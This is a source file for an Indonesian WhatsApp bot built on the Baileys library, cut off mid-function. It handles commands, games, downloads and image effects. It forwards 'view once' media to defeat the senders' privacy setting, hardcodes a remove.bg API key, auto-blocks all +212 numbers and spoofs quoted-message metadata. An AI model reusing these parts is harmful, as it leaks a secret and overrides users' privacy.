require('./settings')
require('./lib/funclist')
const { exec, spawn, execSync } = require('child_process')
const util = require('util')
const axios = require('axios')
const moment = require('moment-timezone')
const chalk = require('chalk')
const cheerio = require('cheerio')
const crypto = require('crypto')
const cookie = require('cookie')
const FormData = require('form-data')
const FileType = require('file-type')
const fetch = require('node-fetch')
const fsx = require('fs-extra')
const ffmpeg = require('fluent-ffmpeg')
const Jimp = require('jimp')
const jsobfus = require('javascript-obfuscator')
const PhoneNumber = require('awesome-phonenumber')
const process = require('process')
const ms = require('ms')
const speed = require('performance-now')
const syntaxerror = require('syntax-error')
const ytdl = require('ytdl-core')
const os = require('os')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, MessageType, MessageOptions, Mimetype } = require("@adiwajshing/baileys")
const { clockString, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, parseMention } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/list')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,  Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { Configuration, OpenAIApi } = require("openai")
const fs = require('fs')
const { antiSpam } = require('./lib/antispam')
const { color, bgcolor } = require('./lib/color')
const { jadibot, conns } = require('./jadibot')
const textpro = require('./lib/textpro')
const { uptotelegra, TelegraPh } = require('./scrape/upload')
const { dafontSearch, dafontDown } = require('./scrape/dafont')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4 } = require('./scrape/yt')
const anon = require('./lib/menfess')
const kirleys = require('@adiwajshing/baileys')
const vm = require('node:vm')
const maker = require('mumaker')
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const banned = JSON.parse(fs.readFileSync('./database/banned.json'))
const db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
const dblist = JSON.parse(fs.readFileSync('./database/listall.json'))
let welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

module.exports = dark = async (dark, m, chatUpdate, store) => {
try {
        const gakbisaowner = `${ownerNomor}@s.whatsapp.net`
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const content = JSON.stringify(m.message)
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await dark.decodeJid(dark.user.id)
        const itsMedark = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
        const tahunBaru = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = tahunBaru - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const idulFitri = new Date('April 22, 2023 00:00:00')
        const ayeuna = new Date().getTime()
        const ceIroh = idulFitri - ayeuna
        const hahari = Math.floor( ceIroh / (1000 * 60 * 60 * 24));
        const hajam = Math.floor( ceIroh % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const hamenit = Math.floor( ceIroh % (1000 * 60 * 60) / (1000 * 60))
        const hadetik = Math.floor( ceIroh % (1000 * 60) / 1000)
        const idulAdha = new Date('Juni 29, 2023 00:00:00')
        const nembe = new Date().getTime()
        const ceDadah = idulAdha - nembe
        const hihari = Math.floor( ceDadah / (1000 * 60 * 60 * 24));
        const hijam = Math.floor( ceDadah % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const himenit = Math.floor( ceDadah % (1000 * 60 * 60) / (1000 * 60))
        const hidetik = Math.floor( ceDadah % (1000 * 60) / 1000)
        const UltahCreator = new Date('Januari 19, 2023 00:00:00')
        const Creatordark = new Date().getTime()
        const darkBotWA = UltahCreator - Creatordark
        const mdhari = Math.floor( darkBotWA / (1000 * 60 * 60 * 24));
        const mdjam = Math.floor( darkBotWA % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const mdmenit = Math.floor( darkBotWA % (1000 * 60 * 60) / (1000 * 60))
        const mddetik = Math.floor( darkBotWA % (1000 * 60) / 1000)
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await dark.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false 
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(sender)
    	const isUser = pendaftar.includes(sender)
    	const banUser = await dark.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
  
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
  }
} catch (err) {
console.error(err)
}

if (!dark.public) {
if (!m.key.fromMe) return
}

var python=require('python').shell;

//Fake Reply
const ftroli = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 200, status: 1,surface : 2,message: `${fake}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: fs.readFileSync('./stik/quoted.jpg'), sellerJid: `0@s.whatsapp.net`}}}

// a callback to handle the response
var mycallback = function(err, data) {
   if (err) {
     console.error(err);
   } else {
     console.log("Callback function got : " + data);
   }
};

// to test, read and execute commands from stdin
process.stdin.resume();
process.stdin.setEncoding('utf8');
process.stdin.on('data', function(chunk) {
   python(chunk, mycallback);
});
var mdu = ['red','green','yellow','blue','magenta','cyan','white']
var halalu = mdu[Math.floor(Math.random() * mdu.length)]
var mdo = ['red','green','yellow','blue','magenta','cyan','white']
var halalo = mdo[Math.floor(Math.random() * mdo.length)]
var mdi = ['red','green','yellow','blue','magenta','cyan','white']
var halali = mdi[Math.floor(Math.random() * mdi.length)]
var mda = ['red','green','yellow','blue','magenta','cyan','white']
var halala = mda[Math.floor(Math.random() * mda.length)]
var mde = ['red','green','yellow','blue','magenta','cyan','white']
var halale = mde[Math.floor(Math.random() * mde.length)]

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(' - 𝙺𝚊𝚢𝚕𝚊 𝙱𝚘𝚝 '), color(`[ PESAN ]`, `${halalu}`), color(`FROM`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`Text :`, `${halala}`), color(`${body}`, `${halale}`))
}

if (isCmd && !isUser) {
pendaftar.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
}

if (isCmd && antiSpam.isFiltered(from) && !m.isGroup) {
console.log(color('[SPAM]', 'red'), color(wib, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
return m.reply('')
}
        
if (isCmd && antiSpam.isFiltered(from) && m.isGroup) {
console.log(color('[SPAM]', 'red'), color(wib, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
return m.reply('Beri Jeda Napa Bang')
}

if (isCmd && !itsMedark) antiSpam.addFilter(from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
  
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam 🌌'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Sore 🌃'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore 🌅'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang 🏙'
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌄'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌉'
 } 
  
// Button
const tempButton = async(remoteJid, text, footer, content) => {
			// const { displayText, url, contentText, footer } = content
			//send a template message!
			const templateMessage = {
			  viewOnceMessage: {
				message: {
				  templateMessage: {
					hydratedTemplate: {
					  hydratedContentText: text,
					  hydratedContentFooter: footer,
					  hydratedButtons: content
					},
				  }
				}
			  }
			}
			const sendMsg = await dark.relayMessage(remoteJid, templateMessage, {})
		  }
  
//setpp
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
dark.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
dark.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) dark.sendText(roof.p, `Silahkan pilih \n\nBatu🪨\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) dark.sendText(roof.p2, `Silahkan pilih \n\nBatu🪨\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) dark.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
dark.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) dark.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) dark.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
dark.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}

//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
 }
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await dark.sendText(room.x, str, m, { mentions: parseMention(str) } )
await dark.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

if (!isCmd && isAlreadydarkList(chath, dblist)) {
var getmddata = getDatadarkList(chath, dblist)
if (getmddata.isImage === false) {
dark.sendMessage(m.chat, { text: senddarkList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getmddata.image_url)
dark.sendImage(m.chat, buff, `${getmddata.response}`, m)
}
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

if (m.sender.startsWith('212')) return dark.updateBlockStatus(m.sender, 'block')
if (m.key.remoteJid == 'status@broadcast') return dark.sendReadReceipt(from, m.sender, [m.key.id])

async function senddarkMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await dark.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const sendSticker = (pesan) => {
dark.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

try {
ppuser = await dark.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await reSize(ppuser, 300, 300)

if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${m.sender.split("@")[0]}\n├ *Clock* : ${wib} WIB\n└ *Message* : ${m.mtype}`
dark.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m}).catch(_ => m.reply('Mungkin dah pernah dibuka bot'))
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `dark Bot WhatsApp`, 
"jpegThumbnail": ppnyauser
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '6285870808160@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: ppnyauser } } }

const reply = (teks) => {
dark.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : repPy })
  }

const banRep = () => {
dark.sendMessage(m.chat, {
text:`Maaf Anda Sudah Di Banned Silahkan Chat @${creator.split("@")[0]} Untuk Membuka Nya`,
mentions: [creator],
},
{
quoted:m
})
}

if (isCmd && isBanned) {
return banRep()
}

let list = []
for (let i of owner) {
list.push({
displayName: await dark.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await dark.getName(i + '@s.whatsapp.net')}\n
FN:${await dark.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:darkbotzmd@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:Mending Turu Banh\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

dark.sendListMsg = (jid, text = '', footer = '', title = '' , butText = '', sects = [], quoted) => {
        let sections = sects
        var listMes = {
        text: text,
        footer: footer,
        title: title,
        buttonText: butText,
        sections
        }
        dark.sendMessage(jid, listMes, { quoted: quoted })
        }

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: 'dark Bot',
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestMessage: {
			//currencyCodeIso4217: "USD",
			//amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					//text: 'Creator dark'
				}
			},
			//expiryTimestamp: 999999999,
			amount: {
				//value: 91929291929,
				//offset: 1000,
				//currencyCode: "USD"
			}
		}
	}
}

let rn = ['recording','composing']
let jd = rn[Math.floor(Math.random() * rn.length)];

if (command) {
//dark.sendPresenceUpdate(jd, from)
dark.readMessages([m.key])
}

function simpan(path, buff) {
    fs.writeFileSync(path, buff)
    return path
}
function getRandom(ext) {
    ext = ext || ""
    return `${Math.floor(Math.random() * 100000)}.${ext}`
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await dark.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await dark.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}
  
async function sendPoll(jid, text, list) {
dark.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function bygbt(text) {
dark.sendMessage(text, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "24yjkNG4jrXeh1WcMdMJMWD2",
    ...form.getHeaders()
  }
})
return res.data
}

async function getFile(media) {
        let data = Buffer.isBuffer(media) ? media : isUrl(media) ? await ( await fetch(media)).buffer() : fs.existsSync(media) ? fs.readFileSync(media) : /^data:.*?\/.*?;base64,/i.test(media) ? Buffer.from(media.split(",")[1]) : null
        if (!data) return new Error("Result is not a buffer")
        let type = await FileType.fromBuffer(data) || {
          mime: "application/octet-stream",
          ext: ".bin"
        }
        return {
          data,
          ...type
        }
      }

async function sendFile(jid, media, options={}) {
        let file = await getFile(media)
        let mime = file.ext, type
        if (mime == "mp3") {
          type = "audio"
          options.mimetype = "audio/mpeg"
          options.ptt = options.ptt || false
        }
        else if (mime == "jpg" || mime == "jpeg" || mime == "png") type = "image"
        else if (mime == "webp") type = "sticker"
        else if (mime == "mp4") type = "video"
        else type = "document"
        return dark.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
      }

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function genProfile(dark, m) {
   let font = await Jimp.loadFont('./name.fnt'), 
     mask = await Jimp.read('https://i.imgur.com/552kzaW.png'), 
     welcome = await Jimp.read("https://telegra.ph/file/81260a8b9e8cff26d2b48.jpg"), 
     avatar = await Jimp.read(await dark.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')), 
     status = (await dark.fetchStatus(m.sender).catch(console.log) || {}).status?.slice(0, 30) || 'Not Detected' 
     await avatar.resize(460, 460) 
     await mask.resize(460, 460) 
     await avatar.mask(mask) 
     await welcome.resize(welcome.getWidth(), welcome.getHeight()) 
     await welcome.print(font, 550, 180, 'Nama:') 
     await welcome.print(font, 650, 255, m.pushName.slice(0, 25)) 
     await welcome.print(font, 550, 340, 'Bio:') 
     await welcome.print(font, 650, 415, status) 
     await welcome.print(font, 550, 500, 'Nomor:') 
     await welcome.print(font, 650, 575, PhoneNumber('+' + m.sender.split('@')[0]).getNumber('international')) 
     return await welcome.composite(avatar, 50, 170).getBufferAsync('image/png') 
}
  
async function tiktokdl(url) {
    try {
